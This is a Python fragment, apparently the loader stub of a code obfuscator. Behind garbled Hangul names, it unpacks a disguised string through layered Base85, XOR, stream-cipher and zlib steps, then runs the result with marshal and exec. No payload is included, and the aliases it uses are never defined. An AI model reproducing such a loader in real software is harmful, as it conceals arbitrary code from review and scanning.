# ============ DECRYPTION FUNCTIONS ============
def _xor_dec(data, key):
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    return bytes(result)

def _stream_dec(data, key, nonce):
    result = bytearray()
    combined = key + nonce
    for i, byte in enumerate(data):
        key_byte = combined[i % len(combined)] ^ (i & 0xFF) ^ ((i >> 8) & 0xFF)
        result.append(byte ^ key_byte)
    return bytes(result)

def 맔쓃펃뙼옊뺗윐욻(s):
    """Decode weird Unicode string back to bytes"""
    result = []
    for c in s:
        o = ord(c)
        if 0x4E00 <= o <= 0x9FFF:
            result.append((o - 0x4E00) & 0xFF)
        else:
            result.append(o & 0xFF)
    return _bytes(result)

class __낄팯춣웕꽙퐫__:
    def __init__(self, data, keys):
        self._data = data
        self._keys = keys
        
    def 푼둅큄랴툟욧앳찒(self):
        try:
            # Step 1: Decode weird string to bytes
            _curr = 맔쓃펃뙼옊뺗윐욻(self._data)
            
            # Step 2: Process each layer in reverse
            for _key in reversed(self._keys):
                # Base85 decode
                _curr = _b64.b85decode(_curr)
                
                _parts = _key.split(":")
                _type = _parts[0]
                
                # Decrypt
                if _type == "xor":
                    _k = _bytes.fromhex(_parts[1])
                    _curr = _xor_dec(_curr, _k)
                elif _type == "str":
                    _k = _bytes.fromhex(_parts[1])
                    _n = _bytes.fromhex(_parts[2])
                    _curr = _stream_dec(_curr, _k, _n)
                
                # Decompress
                _curr = _zlib.decompress(_curr)
            
            # Step 3: Execute
            _target = _marshal.loads(_curr)
            _builtins['exec'](_target, globals())
            
        except Exception as _e:
            print(f"[!] Error: {_e}")
            import traceback
            traceback.print_exc()

